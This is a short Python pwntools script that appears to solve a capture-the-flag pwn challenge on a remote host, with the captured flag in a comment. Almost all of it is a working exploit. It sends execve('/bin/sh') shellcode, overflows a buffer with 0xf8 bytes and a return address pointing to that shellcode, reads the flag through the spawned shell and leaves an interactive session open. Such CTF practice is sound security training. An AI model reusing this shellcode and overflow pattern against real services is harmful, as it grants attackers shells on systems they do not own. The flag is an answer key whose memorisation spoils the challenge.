#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{6EWQLMK1GDzMlV6vPFokzmtux4Fh42yJ}


host , port = 'csie.ctf.tw' , 10126

y = remote(host,port)

sc = '\x48\x31\xf6\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05'

y.sendafter( ':' , sc )

y.sendlineafter( ':' , 'D' * 0xf8 + p64( 0x601080 ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

